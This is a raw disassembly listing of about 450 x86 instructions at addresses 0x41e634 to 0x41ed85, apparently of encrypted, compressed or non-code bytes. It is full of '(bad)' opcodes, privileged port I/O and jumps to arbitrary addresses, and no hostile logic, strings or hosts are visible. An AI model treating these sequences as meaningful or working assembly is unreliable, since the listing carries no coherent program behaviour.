  41e634:	ror    BYTE PTR ds:0x32ce5c3d,1
  41e63a:	mov    ecx,0xe6c5987
  41e63f:	and    al,0xe7
  41e641:	xchg   esi,eax
  41e642:	aam    0xf0
  41e644:	or     edx,esp
  41e646:	jl     0x41e6bd
  41e648:	xchg   BYTE PTR [edi+0x29],dh
  41e64b:	pop    ebx
  41e64c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e64d:	and    dl,ah
  41e64f:	rcr    BYTE PTR [ecx-0x7e502c0f],1
  41e655:	mov    BYTE PTR [eax+0x20],al
  41e658:	cmc    
  41e659:	std    
  41e65a:	js     0x41e678
  41e65c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65d:	sbb    bl,0x35
  41e660:	pop    esp
  41e661:	out    0x11,al
  41e663:	push   0xa6e24cb1
  41e668:	jecxz  0x41e6cd
  41e66a:	jo     0x41e6e8
  41e66c:	lea    edx,[ebp+0x73]
  41e66f:	push   ecx
  41e671:	(bad)  
  41e672:	int3   
  41e673:	out    dx,eax
  41e674:	(bad)  
  41e675:	lock sub BYTE PTR [ebx],0x3c
  41e679:	mov    WORD PTR [edi-0x3b],?
  41e67c:	mov    ch,BYTE PTR [ebp+0x62]
  41e67f:	fadd   DWORD PTR [ebp+0x52e7b608]
  41e685:	sub    bl,BYTE PTR [esi-0x43bcaeb2]
  41e68b:	mov    ds:0xec539160,al
  41e690:	dec    esp
  41e691:	(bad)  
  41e692:	fist   WORD PTR [ebp+esi*2+0x24589a79]
  41e699:	outs   dx,BYTE PTR ds:[esi]
  41e69a:	xchg   edx,eax
  41e69b:	sub    DWORD PTR es:[eax-0x4b],edx
  41e69f:	push   esi
  41e6a0:	jb     0x41e6cb
  41e6a2:	push   edx
  41e6a3:	fistp  DWORD PTR ds:0x4006f76a
  41e6a9:	lock in eax,0xe9
  41e6ac:	jns    0x41e663
  41e6ae:	ror    DWORD PTR [eax],cl
  41e6b0:	es jle 0x41e681
  41e6b3:	or     ah,BYTE PTR [esi]
  41e6b5:	add    cl,BYTE PTR [edx-0x4b026e0b]
  41e6bb:	and    dl,BYTE PTR [esp+edi*8]
  41e6be:	sbb    eax,0x512e86e6
  41e6c3:	pop    esi
  41e6c4:	or     DWORD PTR [eax-0x4d5d70fc],ebp
  41e6ca:	ja     0x41e6b7
  41e6cc:	inc    esp
  41e6cd:	dec    edx
  41e6ce:	stos   DWORD PTR es:[edi],eax
  41e6cf:	ins    DWORD PTR es:[edi],dx
  41e6d0:	adc    al,0xae
  41e6d2:	iret   
  41e6d3:	fisubr DWORD PTR [ebx-0x4a]
  41e6d6:	add    al,0x1e
  41e6d8:	in     eax,dx
  41e6d9:	ficom  WORD PTR [eax]
  41e6db:	and    eax,0x825ed665
  41e6e0:	pop    esi
  41e6e1:	adc    esi,esp
  41e6e3:	push   ecx
  41e6e4:	int    0x8b
  41e6e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6e7:	nop
  41e6e8:	jb     0x41e748
  41e6ea:	lods   al,BYTE PTR ds:[esi]
  41e6eb:	xlat   BYTE PTR ds:[ebx]
  41e6ec:	in     eax,0x60
  41e6ee:	scas   al,BYTE PTR es:[edi]
  41e6ef:	xchg   esp,eax
  41e6f0:	out    0xf3,al
  41e6f2:	ins    BYTE PTR es:[edi],dx
  41e6f3:	cmp    DWORD PTR [edi+0xd49db0c],0xffffffb1
  41e6fa:	in     al,dx
  41e6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6fc:	loop   0x41e6d7
  41e6fe:	inc    esp
  41e6ff:	ret    0x366e
  41e702:	lahf   
  41e703:	fnstsw WORD PTR [esp+ebx*2]
  41e706:	mov    eax,ebx
  41e708:	pop    ecx
  41e709:	add    edx,DWORD PTR fs:[ebp-0x19]
  41e70d:	mov    ds:0xbe02036f,al
  41e712:	dec    esp
  41e714:	je     0x41e72f
  41e716:	nop
  41e717:	shr    DWORD PTR ds:0x2dfcf912,0xf4
  41e71e:	mov    dh,0xcc
  41e720:	repnz imul esp,DWORD PTR [eax+0x16f7ff0a],0x88806803
  41e72b:	lock push cs
  41e72d:	inc    eax
  41e72e:	jp     0x41e74f
  41e730:	add    ah,BYTE PTR [eax+eax*1+0x74c1a85c]
  41e737:	mov    cl,0xbe
  41e739:	repnz ins DWORD PTR es:[edi],dx
  41e73b:	push   esp
  41e73c:	es dec edx
  41e73e:	rcr    DWORD PTR ds:0x4c9a50a0,0xca
  41e745:	out    0xe3,eax
  41e747:	stc    
  41e748:	xor    al,0x16
  41e74a:	sbb    al,al
  41e74c:	rcr    DWORD PTR [eax+0x7d9dd3e5],cl
  41e752:	test   ecx,esi
  41e754:	out    dx,eax
  41e755:	xor    DWORD PTR [ebx],ecx
  41e757:	xor    BYTE PTR [esi+0x5832e544],dl
  41e75d:	mov    dh,0x20
  41e75f:	retf   0xae93
  41e762:	ret    
  41e763:	jle    0x41e719
  41e765:	pop    eax
  41e766:	aaa    
  41e767:	out    0x1f,al
  41e769:	or     bl,bl
  41e76b:	adc    DWORD PTR [ebx+edx*4+0x68af8dfe],esi
  41e772:	xor    eax,0xb51e6f8c
  41e777:	call   0x308e02c8
  41e77c:	adc    ebp,DWORD PTR ds:0xc2091d61
  41e782:	inc    ebx
  41e783:	ds ja  0x41e77a
  41e786:	ins    BYTE PTR es:[edi],dx
  41e787:	cmp    edx,DWORD PTR ds:0xc4176d23
  41e78d:	popf   
  41e78e:	rcl    DWORD PTR [ebx],cl
  41e790:	xor    eax,0x49b56bc4
  41e795:	jo     0x41e76f
  41e797:	enter  0xf8a4,0x4e
  41e79b:	push   ecx
  41e79c:	(bad)
  41e79f:	cmp    al,0xd5
  41e7a1:	jg     0x41e773
  41e7a3:	cwde   
  41e7a4:	fadd   st(2),st
  41e7a6:	test   eax,0xec597a94
  41e7ab:	ret    
  41e7ac:	mov    edx,0x52c50309
  41e7b1:	scas   eax,DWORD PTR es:[edi]
  41e7b2:	mov    esi,0xb0cc16c4
  41e7b7:	fistp  QWORD PTR [eax]
  41e7b9:	inc    ebp
  41e7ba:	inc    edi
  41e7bb:	inc    edi
  41e7bc:	push   ebp
  41e7bd:	sub    BYTE PTR [edi+0x9e4ac0d],dl
  41e7c3:	sbb    BYTE PTR [edi+0x7587e3bc],bh
  41e7c9:	and    BYTE PTR [esi-0x71b0a204],al
  41e7cf:	push   ss
  41e7d0:	das    
  41e7d1:	jle    0x41e7f4
  41e7d3:	mov    cl,0xc0
  41e7d5:	inc    ecx
  41e7d6:	dec    esp
  41e7d7:	dec    ecx
  41e7d8:	xchg   edx,eax
  41e7d9:	jbe    0x41e84a
  41e7db:	push   ecx
  41e7dc:	mov    eax,ds:0x4b9faf3
  41e7e1:	dec    ebp
  41e7e2:	adc    esp,DWORD PTR [edx-0x4c443109]
  41e7e8:	sub    BYTE PTR [edi+eiz*4],cl
  41e7eb:	pop    ebx
  41e7ec:	inc    ebp
  41e7ed:	pop    edi
  41e7ee:	gs iret 
  41e7f0:	push   0x5
  41e7f2:	mov    cs,WORD PTR [ebx+ebp*1]
  41e7f5:	cmp    eax,DWORD PTR [eax]
  41e7f7:	fs add eax,0x9570ceb5
  41e7fd:	mov    bh,BYTE PTR [edx-0x6cacf235]
  41e803:	or     eax,0x2aa25f5f
  41e808:	call   0x459aacf7
  41e80d:	or     eax,0x783f53f8
  41e812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e813:	inc    eax
  41e814:	mov    ch,0x89
  41e816:	pop    ds
  41e817:	dec    eax
  41e818:	xchg   edi,eax
  41e819:	out    0x61,eax
  41e81b:	cmp    eax,0xd8942735
  41e820:	sub    BYTE PTR ss:[esi+edx*8-0x7e],dl
  41e825:	xchg   sp,ax
  41e827:	or     BYTE PTR gs:[eax],cl
  41e82a:	cli    
  41e82b:	xchg   ebx,eax
  41e82c:	ins    BYTE PTR es:[edi],dx
  41e82d:	nop
  41e82e:	lods   al,BYTE PTR ds:[esi]
  41e82f:	cwde   
  41e830:	addr16 inc esp
  41e832:	out    0xad,al
  41e834:	fdivr  QWORD PTR [ebp+0x24]
  41e837:	jno    0x41e7d9
  41e839:	imul   esp,DWORD PTR [eax+0x4d],0x5d
  41e83d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83e:	sub    esi,esi
  41e840:	ret    
  41e841:	repnz daa 
  41e843:	adc    cl,al
  41e845:	xor    eax,0x9a23a145
  41e84a:	pop    ebx
  41e84c:	(bad)  [esi+ebp*8]
  41e84f:	faddp  st(6),st
  41e851:	nop
  41e852:	xchg   ah,bl
  41e854:	xor    BYTE PTR [edx+esi*1],0x6f
  41e858:	fsubr  DWORD PTR [ecx-0x38c562]
  41e85e:	jo     0x41e7ef
  41e860:	call   0x53ec33d2
  41e865:	icebp  
  41e866:	sahf   
  41e867:	and    al,0x6e
  41e869:	cmp    al,0x8c
  41e86b:	inc    edx
  41e86c:	fnstenv [esi-0x8693d1c]
  41e872:	mov    BYTE PTR [esi+0x2c77f5a8],al
  41e878:	dec    esp
  41e879:	inc    eax
  41e87a:	and    edx,0x60c1f8d6
  41e880:	cmp    esp,DWORD PTR ds:0xa61e1777
  41e886:	fiadd  WORD PTR [esi]
  41e888:	imul   esp,edx,0xfb0fad96
  41e88e:	sbb    al,0x8
  41e890:	dec    esp
  41e891:	sub    DWORD PTR [edx],esi
  41e893:	inc    ecx
  41e894:	(bad)  
  41e896:	stc    
  41e897:	rcr    BYTE PTR [edx+0x2a],0xce
  41e89b:	cs inc ecx
  41e89d:	jmp    0x41e914
  41e89f:	cli    
  41e8a0:	cmp    al,0x6b
  41e8a2:	mov    ds:0xaf2c59b4,eax
  41e8a7:	sub    al,0x89
  41e8a9:	ds aad 0xde
  41e8ac:	out    dx,eax
  41e8ad:	mov    ebx,0xa3db9c54
  41e8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8b3:	or     ebx,DWORD PTR [ecx-0x2]
  41e8b6:	mov    ch,0x48
  41e8b8:	and    BYTE PTR [eax],0x3f
  41e8bb:	mov    eax,0x2549cb78
  41e8c0:	cmp    al,0x3d
  41e8c2:	inc    ecx
  41e8c3:	xchg   DWORD PTR [edx+ecx*1+0x37],ebx
  41e8c7:	mov    BYTE PTR [ebp+eax*2-0x37c1fd71],al
  41e8ce:	stos   BYTE PTR es:[edi],al
  41e8cf:	daa    
  41e8d0:	mov    DWORD PTR [esi-0x7a],edx
  41e8d3:	es xor al,0x6
  41e8d6:	lahf   
  41e8d7:	lahf   
  41e8d8:	nop
  41e8d9:	pop    ebp
  41e8da:	mov    dl,0xb5
  41e8dc:	mov    ebp,0x9e6b2da
  41e8e1:	aad    0xaa
  41e8e3:	sub    eax,0xe30aa781
  41e8e8:	mov    edi,0x643fb091
  41e8ed:	jne    0x41e942
  41e8ef:	les    edi,FWORD PTR [ebp+0x5a342125]
  41e8f5:	clc    
  41e8f6:	xor    BYTE PTR [eax],cl
  41e8f8:	mov    al,0x5d
  41e8fa:	je     0x41e8f2
  41e8fc:	(bad)  
  41e8fd:	aaa    
  41e8fe:	jb     0x41e8b7
  41e900:	das    
  41e901:	call   0x68f9:0x18989ef7
  41e908:	mov    dh,ah
  41e90a:	loope  0x41e8d3
  41e90c:	dec    ebx
  41e90d:	and    DWORD PTR [ecx+0x8],esi
  41e910:	jmp    0x52b42a18
  41e915:	lods   eax,DWORD PTR ds:[esi]
  41e916:	and    al,0x29
  41e918:	pop    ebp
  41e919:	cmc    
  41e91a:	mov    al,ds:0xe625b114
  41e91f:	ret    0xd1b7
  41e922:	cdq    
  41e923:	cmp    BYTE PTR [ecx+0x39266960],ah
  41e929:	lea    ebx,[ecx+0x1dc5e11a]
  41e92f:	(bad)  
  41e930:	das    
  41e931:	mov    edi,0x8ddfa85e
  41e936:	retf   0x72fe
  41e939:	gs cld 
  41e93b:	jmp    0x6d4c:0xc045720a
  41e942:	out    0xfc,eax
  41e944:	stos   DWORD PTR es:[edi],eax
  41e945:	pop    ds
  41e946:	inc    edx
  41e947:	outs   dx,DWORD PTR ds:[esi]
  41e948:	popf   
  41e949:	rol    BYTE PTR [edx-0x53],0x7c
  41e94d:	jecxz  0x41e93d
  41e94f:	scas   al,BYTE PTR es:[edi]
  41e950:	pop    ax
  41e952:	(bad)  
  41e953:	jl     0x41e9d2
  41e955:	mov    al,ds:0x8a4f5149
  41e95a:	pushw  0xa
  41e95d:	out    0x81,al
  41e95f:	push   ecx
  41e960:	mov    edx,0xa0b4c112
  41e965:	enter  0xe0be,0xf5
  41e969:	jge    0x41e9d5
  41e96b:	jb     0x41e967
  41e96d:	jl     0x41e998
  41e96f:	mov    dh,0xd9
  41e971:	or     esp,0xabfe8701
  41e977:	sbb    al,0x4b
  41e979:	retf   0x94e1
  41e97c:	mov    ecx,0xe22da4e6
  41e981:	mov    dh,0xb4
  41e983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e984:	xchg   ecx,eax
  41e985:	pop    esi
  41e986:	cmc    
  41e987:	call   0x83d9bff0
  41e98c:	and    dh,bh
  41e98e:	sub    al,0x5d
  41e990:	xlat   BYTE PTR ds:[ebx]
  41e991:	loopne 0x41e9f2
  41e993:	cmp    DWORD PTR ds:0x20d6d3ed,ebp
  41e999:	into   
  41e99a:	inc    edx
  41e99b:	std    
  41e99c:	dec    ebx
  41e99d:	inc    ebx
  41e99e:	in     al,0x19
  41e9a0:	adc    BYTE PTR [edi+edi*8+0x7b],0xb2
  41e9a5:	inc    edi
  41e9a6:	xchg   edi,eax
  41e9a7:	fstp   TBYTE PTR [ecx-0x2a6ceef0]
  41e9ad:	push   0xffffff81
  41e9af:	jp     0x41e958
  41e9b1:	fdivr  st,st(0)
  41e9b3:	dec    ebp
  41e9b4:	(bad)  
  41e9b5:	fnsave [ebp+ebx*4-0x51767172]
  41e9bc:	fsub   QWORD PTR [edi-0x5b0c42a2]
  41e9c2:	add    eax,0x65f7dd43
  41e9c7:	add    DWORD PTR [ecx],edx
  41e9c9:	test   DWORD PTR [ebx],esp
  41e9cb:	adc    bh,BYTE PTR [edx+0x634e9405]
  41e9d1:	ret    
  41e9d2:	sbb    eax,0x511558f6
  41e9d7:	xchg   ebx,eax
  41e9d8:	cmp    ebx,DWORD PTR [eax+0x6770eca]
  41e9de:	rcl    BYTE PTR [edi+eax*1+0xf],0xe6
  41e9e3:	ret    
  41e9e4:	jg     0x41e99f
  41e9e6:	popf   
  41e9e7:	mov    al,0xa5
  41e9e9:	rol    esp,cl
  41e9eb:	sub    BYTE PTR [edx+0x3e],ch
  41e9ee:	(bad)  
  41e9ef:	sbb    DWORD PTR [ecx],edi
  41e9f1:	rcr    BYTE PTR [edx-0x21],cl
  41e9f4:	xchg   esp,eax
  41e9f5:	jmp    0xd4e5:0xeccbc21f
  41e9fc:	inc    eax
  41e9fd:	test   al,0x2e
  41e9ff:	cmc    
  41ea00:	push   ss
  41ea01:	jmp    0x37c5ef33
  41ea06:	dec    ebx
  41ea07:	jno    0x41e9f6
  41ea09:	addr16 dec edi
  41ea0b:	inc    edi
  41ea0c:	xchg   esi,eax
  41ea0d:	mov    bl,0xd
  41ea0f:	pop    ds
  41ea10:	push   ebp
  41ea11:	adc    esi,DWORD PTR [eax-0x131f1d37]
  41ea17:	adc    eax,0x66b6e7ee
  41ea1c:	pop    ebp
  41ea1d:	mov    ebx,DWORD PTR [ebx+0x18]
  41ea20:	xor    BYTE PTR [ebp+0x1c],al
  41ea23:	in     al,0xfc
  41ea25:	inc    ebx
  41ea26:	ror    BYTE PTR [edi+0x5255ca71],1
  41ea2c:	mov    edx,es
  41ea2e:	out    0xe1,al
  41ea30:	dec    edi
  41ea31:	xchg   ebx,eax
  41ea32:	rcr    BYTE PTR [esi+0x5e],0x10
  41ea36:	in     eax,0xa1
  41ea38:	(bad)  
  41ea39:	aaa    
  41ea3a:	sbb    DWORD PTR [edx-0x3a77e7e0],ecx
  41ea40:	(bad)  
  41ea42:	mov    DWORD PTR [ebx-0x5c14d00b],esp
  41ea48:	imul   ebx,DWORD PTR [edi],0x6a
  41ea4b:	dec    ebx
  41ea4c:	scas   eax,DWORD PTR es:[edi]
  41ea4d:	push   0x25
  41ea4f:	lea    ecx,[ebx]
  41ea51:	pop    edx
  41ea52:	mov    bh,0xf6
  41ea54:	adc    ebp,esp
  41ea56:	popf   
  41ea57:	(bad)  
  41ea58:	icebp  
  41ea59:	jecxz  0x41ea4b
  41ea5b:	xor    al,0x6f
  41ea5d:	imul   ebx,edi,0x845a6551
  41ea63:	or     al,0xac
  41ea65:	rcl    DWORD PTR [ecx],0xa3
  41ea68:	test   BYTE PTR [eax+0xb711f51],0x61
  41ea6f:	inc    ebx
  41ea70:	ror    BYTE PTR [edx+ebx*4-0x4d],1
  41ea74:	imul   ebx,DWORD PTR [ecx-0x1557b8c0],0x7c3bbff2
  41ea7e:	into   
  41ea7f:	int3   
  41ea80:	xor    ebx,DWORD PTR [esi-0x7406ff62]
  41ea86:	(bad)  
  41ea88:	test   al,0x27
  41ea8a:	test   eax,0x15b9eb62
  41ea8f:	fidivr DWORD PTR [esi-0xa69a5c6]
  41ea95:	addr16 imul edx,ecx,0x86bd2911
  41ea9c:	popf   
  41ea9d:	bound  esp,QWORD PTR [esi]
  41ea9f:	test   eax,0x4f7aef92
  41eaa4:	jle    0x41ea9e
  41eaa6:	rcl    BYTE PTR [ebp+eax*4-0x69cfaf15],1
  41eaad:	sub    dh,BYTE PTR [ebx]
  41eaaf:	dec    eax
  41eab0:	sub    al,0x7c
  41eab2:	(bad)  
  41eab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab4:	mov    cl,0xf4
  41eab6:	cmp    al,0xac
  41eab8:	in     al,0x84
  41eaba:	retf   
  41eabb:	mov    eax,0xb35cfb44
  41eac0:	adc    esi,DWORD PTR ds:0x453bb564
  41eac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac7:	and    bl,BYTE PTR [edi]
  41eac9:	sbb    eax,0x7103e8c0
  41eace:	xor    eax,0xd4ba41ac
  41ead3:	adc    al,0x34
  41ead5:	je     0x41eb44
  41ead7:	mov    ch,0xe2
  41ead9:	sub    bh,BYTE PTR [edx-0x5b]
  41eadc:	cmp    al,0x3
  41eade:	adc    dh,BYTE PTR [eax+0x482f202f]
  41eae4:	ins    DWORD PTR es:[edi],dx
  41eae5:	adc    ecx,esi
  41eae7:	sub    ah,BYTE PTR [esi]
  41eae9:	outs   dx,BYTE PTR ds:[esi]
  41eaea:	mov    bh,BYTE PTR [edi-0x28206ae1]
  41eaf0:	shl    DWORD PTR [esp+eax*4+0x57580745],cl
  41eaf7:	push   edx
  41eaf8:	add    esi,edi
  41eafa:	popa   
  41eafb:	in     eax,0xf6
  41eafd:	lods   al,BYTE PTR ds:[esi]
  41eafe:	add    bl,dl
  41eb00:	shr    DWORD PTR [esi-0x48],0x97
  41eb04:	push   esi
  41eb05:	das    
  41eb06:	inc    ebx
  41eb07:	or     BYTE PTR [edi+0x4c],dl
  41eb0a:	addr16 push ss
  41eb0c:	stc    
  41eb0d:	xor    al,0x2f
  41eb0f:	popf   
  41eb10:	mov    ah,0x49
  41eb12:	mov    cl,0x7b
  41eb14:	jno    0x41eb40
  41eb16:	es sti 
  41eb18:	jg     0x41eae5
  41eb1a:	adc    edi,DWORD PTR [edx-0x75]
  41eb1d:	xchg   ebx,eax
  41eb1e:	adc    BYTE PTR [edx],dh
  41eb20:	scas   al,BYTE PTR es:[edi]
  41eb21:	icebp  
  41eb22:	das    
  41eb23:	inc    edi
  41eb24:	sar    cl,0x3c
  41eb27:	sbb    BYTE PTR [ebx+edx*2],bl
  41eb2a:	imul   esi,DWORD PTR [edx-0x2dad900d],0xc72c9e2b
  41eb34:	(bad)  
  41eb35:	clc    
  41eb36:	push   ebp
  41eb37:	add    al,0x77
  41eb39:	push   ss
  41eb3a:	aam    0xe5
  41eb3c:	repz shr bh,cl
  41eb3f:	sbb    BYTE PTR [esi],bl
  41eb41:	frstor [ebx]
  41eb43:	stos   BYTE PTR es:[edi],al
  41eb44:	sub    DWORD PTR [ecx+0x28fec8c5],ecx
  41eb4a:	lods   al,BYTE PTR ds:[esi]
  41eb4b:	mov    dl,0x29
  41eb4d:	xchg   edi,eax
  41eb4e:	push   ebp
  41eb4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb50:	jne    0x41eadc
  41eb52:	mov    dl,0x76
  41eb54:	or     cl,BYTE PTR [ebp+0x4a]
  41eb57:	leave  
  41eb58:	popa   
  41eb59:	pop    edx
  41eb5a:	add    al,0xa7
  41eb5c:	push   eax
  41eb5d:	inc    ecx
  41eb5e:	shl    BYTE PTR [esi-0x28],cl
  41eb61:	xor    DWORD PTR [ecx],ebx
  41eb63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb64:	out    dx,eax
  41eb65:	or     eax,0xeb6fc765
  41eb6a:	int    0x4
  41eb6c:	daa    
  41eb6d:	jns    0x41eb20
  41eb6f:	mov    dl,0xf6
  41eb71:	mov    ah,BYTE PTR [edx+0x69]
  41eb74:	aaa    
  41eb75:	xchg   edx,eax
  41eb76:	cs hlt 
  41eb78:	and    ch,bl
  41eb7a:	mov    ecx,0x9ecfe7be
  41eb7f:	add    edi,DWORD PTR [edx+0x73]
  41eb82:	in     al,0xac
  41eb84:	pop    eax
  41eb85:	jmp    0xbd02db7a
  41eb8a:	retf   0x6fa8
  41eb8d:	fwait
  41eb8e:	enter  0x5cf6,0xea
  41eb92:	aam    0x64
  41eb94:	call   0xbb26:0xfa7b0f01
  41eb9b:	out    0x28,eax
  41eb9d:	and    esp,DWORD PTR [edx+0x26]
  41eba0:	cli    
  41eba1:	mov    cl,0xf8
  41eba3:	cs icebp 
  41eba5:	and    eax,0x83c86760
  41ebaa:	dec    eax
  41ebab:	enter  0xe760,0x86
  41ebaf:	clc    
  41ebb0:	sbb    BYTE PTR [ebx],0xd3
  41ebb3:	and    bl,BYTE PTR [esi]
  41ebb5:	sub    dl,BYTE PTR [esi+0x7c]
  41ebb8:	out    dx,eax
  41ebb9:	popf   
  41ebba:	(bad)  
  41ebbb:	adc    eax,0x126db06d
  41ebc0:	data16 (bad) 
  41ebc2:	fdivr  DWORD PTR ds:0xb53f0353
  41ebc8:	inc    eax
  41ebc9:	add    al,0x40
  41ebcb:	bound  edx,QWORD PTR [ebp-0x6b]
  41ebce:	jle    0x41ec17
  41ebd0:	jmp    0x41eb7c
  41ebd2:	xchg   BYTE PTR [esi-0x313b326b],dl
  41ebd8:	call   0x2e54ec8
  41ebdd:	daa    
  41ebde:	xlat   BYTE PTR ds:[ebx]
  41ebdf:	pop    ecx
  41ebe0:	mov    BYTE PTR es:[ecx+0x25],al
  41ebe4:	sar    BYTE PTR [ebx-0x5892c2a4],1
  41ebea:	dec    eax
  41ebeb:	or     BYTE PTR [edi],ch
  41ebed:	lods   al,BYTE PTR ds:[esi]
  41ebee:	inc    eax
  41ebef:	add    ecx,DWORD PTR [eax+0x13]
  41ebf2:	pop    ecx
  41ebf3:	fst    DWORD PTR [esi-0x55ba54d]
  41ebf9:	enter  0x5213,0x20
  41ebfd:	sti    
  41ebfe:	fld    DWORD PTR [edi-0x6d502c11]
  41ec04:	jns    0x41ebf3
  41ec06:	ret    0x91ea
  41ec09:	das    
  41ec0a:	popf   
  41ec0b:	add    DWORD PTR [ebp-0xe],ebp
  41ec0e:	arpl   WORD PTR [esi],bp
  41ec10:	(bad)  
  41ec11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec12:	lds    esi,FWORD PTR es:[esi]
  41ec15:	cmp    DWORD PTR [ebp+0x17],edi
  41ec18:	ret    
  41ec19:	inc    edx
  41ec1a:	enter  0x72a4,0x30
  41ec1e:	jae    0x41ec7b
  41ec20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec21:	add    al,0x6c
  41ec23:	dec    eax
  41ec24:	xchg   edx,eax
  41ec25:	sub    cl,BYTE PTR [ebx-0x2418cb62]
  41ec2b:	and    BYTE PTR [eax+0x2294d3de],dl
  41ec31:	inc    ebp
  41ec32:	jnp    0x41ebbc
  41ec34:	push   ss
  41ec35:	(bad)  
  41ec36:	shr    BYTE PTR [bx+di+0x1748],1
  41ec3b:	ret    0x9491
  41ec3e:	data16 data16 mov ss,WORD PTR [edi-0x15ad4269]
  41ec46:	test   eax,0xc3bb2634
  41ec4b:	test   DWORD PTR [edx+0x45],eax
  41ec4e:	fist   WORD PTR [edi+0x32]
  41ec51:	cmp    DWORD PTR [eax+eax*4+0x54421ef1],ecx
  41ec58:	popa   
  41ec59:	inc    edi
  41ec5a:	pop    ecx
  41ec5b:	xchg   esi,eax
  41ec5c:	rol    esi,cl
  41ec5e:	(bad)  
  41ec60:	ja     0x41ec91
  41ec62:	cmp    ebx,DWORD PTR [ebx+0x101079b9]
  41ec68:	pop    ss
  41ec69:	cmp    eax,0xc555bdb9
  41ec6e:	xchg   esi,eax
  41ec6f:	stos   BYTE PTR es:[edi],al
  41ec70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec71:	mov    ds:0x764568ca,al
  41ec76:	inc    eax
  41ec77:	cwde   
  41ec78:	test   eax,0xe8fcd8fd
  41ec7d:	sbb    al,BYTE PTR [ecx+0x1d292041]
  41ec83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec84:	cld    
  41ec85:	sbb    BYTE PTR [esi],dl
  41ec87:	fldcw  WORD PTR [ecx+eiz*8-0x76]
  41ec8b:	imul   esp,DWORD PTR [esi],0xdbe327af
  41ec91:	and    eax,0x406e6dcc
  41ec96:	test   al,0xf3
  41ec98:	and    ch,dh
  41ec9a:	in     al,0x43
  41ec9c:	dec    ecx
  41ec9d:	lods   eax,DWORD PTR ds:[esi]
  41ec9e:	fsub   st,st(3)
  41eca0:	pop    ebx
  41eca1:	mov    bl,bh
  41eca3:	imul   esp,DWORD PTR [eax],0x38
  41eca6:	cmp    eax,0x6addb352
  41ecab:	dec    eax
  41ecac:	push   ebx
  41ecad:	je     0x41ec6b
  41ecaf:	dec    ebp
  41ecb0:	fdivr  QWORD PTR [ecx-0x40]
  41ecb3:	lock jb 0x41ed02
  41ecb6:	mov    eax,ds:0x4c4c9d2a
  41ecbb:	retf   
  41ecbc:	mov    dl,BYTE PTR [ebx]
  41ecbe:	outs   dx,BYTE PTR ds:[esi]
  41ecbf:	out    0x13,al
  41ecc1:	add    al,0x8a
  41ecc3:	dec    edx
  41ecc4:	inc    eax
  41ecc5:	out    0xa,al
  41ecc7:	ja     0x41ec94
  41ecc9:	dec    esp
  41ecca:	sub    al,0xa3
  41eccc:	popa   
  41eccd:	xchg   edi,eax
  41ecce:	mov    edi,0x1ec7844f
  41ecd3:	mov    BYTE PTR [esi+0x76],ch
  41ecd6:	leave  
  41ecd7:	aad    0xe0
  41ecd9:	xchg   ecx,eax
  41ecda:	mov    cl,dh
  41ecdc:	sub    DWORD PTR [ebp+0x7b],edi
  41ecdf:	lods   eax,DWORD PTR ds:[esi]
  41ece0:	dec    ebp
  41ece1:	mov    ebp,ecx
  41ece3:	loop   0x41ec91
  41ece5:	sbb    edx,DWORD PTR [edi+0x1f]
  41ece8:	data16 adc BYTE PTR [esi-0x48],ah
  41ecec:	icebp  
  41eced:	sbb    eax,0xe090c913
  41ecf2:	or     DWORD PTR [edx+0x15],eax
  41ecf5:	popa   
  41ecf6:	xor    dl,ah
  41ecf8:	and    BYTE PTR [ecx+ebx*1+0x63],al
  41ecfc:	cmp    al,0x6d
  41ecfe:	jnp    0x41ecf3
  41ed00:	das    
  41ed01:	je     0x41ecf8
  41ed03:	ret    0x8dc6
  41ed06:	enter  0xcdc6,0x8
  41ed0a:	fimul  DWORD PTR [esp+edi*8]
  41ed0d:	sub    ax,0xacd7
  41ed11:	int3   
  41ed12:	pop    edx
  41ed13:	mov    cl,0x36
  41ed15:	push   cs
  41ed16:	mov    WORD PTR [edx+esi*1-0x2b],ss
  41ed1a:	xchg   esp,eax
  41ed1b:	xor    eax,0xd328be7e
  41ed20:	sub    dh,dh
  41ed22:	inc    esp
  41ed23:	arpl   WORD PTR [edi-0x11],si
  41ed26:	mov    edi,DWORD PTR [esi]
  41ed28:	jne    0x41eda5
  41ed2a:	pop    esi
  41ed2b:	sbb    dl,cl
  41ed2d:	mov    ah,0xf6
  41ed2f:	les    edi,FWORD PTR [edi-0x75]
  41ed32:	adc    eax,0xeddc2f29
  41ed37:	ss mov dh,0x1e
  41ed3a:	and    BYTE PTR [esi],bl
  41ed3c:	mov    cl,0x46
  41ed3e:	leave  
  41ed3f:	jp     0x41ed6c
  41ed41:	outs   dx,DWORD PTR ds:[esi]
  41ed42:	imul   eax,DWORD PTR [ebx+0x25a2da03],0xaf587fea
  41ed4c:	jb     0x41ecd4
  41ed4e:	mov    edx,0x296039f8
  41ed53:	out    dx,eax
  41ed54:	pop    esp
  41ed55:	aas    
  41ed56:	out    0x95,eax
  41ed58:	mov    al,ds:0xb333b499
  41ed5d:	ja     0x41ed8a
  41ed5f:	push   ebx
  41ed60:	fwait
  41ed61:	mov    ds:0x306ab9a6,eax
  41ed66:	das    
  41ed67:	cs jnp 0x41ed7e
  41ed6a:	inc    esp
  41ed6b:	shr    DWORD PTR [eax+0x7a],0x31
  41ed6f:	xchg   BYTE PTR [ecx-0x7],al
  41ed72:	imul   ecx,DWORD PTR [eax+0x5c96bd1e],0x9c96a965
  41ed7c:	lods   eax,DWORD PTR ds:[esi]
  41ed7d:	add    BYTE PTR [eax],bl
  41ed7f:	or     ebp,DWORD PTR [edx+0x11dd068d]
  41ed85:	test   eax,0x4d2b8925
